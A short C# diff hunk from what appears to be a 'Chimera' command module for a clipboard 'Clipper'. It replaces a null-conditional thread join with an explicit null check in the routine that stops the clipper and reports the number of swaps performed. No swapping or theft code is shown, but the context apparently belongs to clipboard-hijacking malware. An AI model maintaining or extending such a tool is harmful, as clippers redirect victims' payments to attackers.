@@ -76,7 +76,7 @@ namespace Chimera.Commands
                     return "[-] Clipper not running.";
                 _running = false;
             }
-            _thread?.Join(1500);
+            if (_thread != null) _thread.Join(1500);
             return "[+] Clipper stopped. Total swaps performed: " + _swapCount;
         }
 
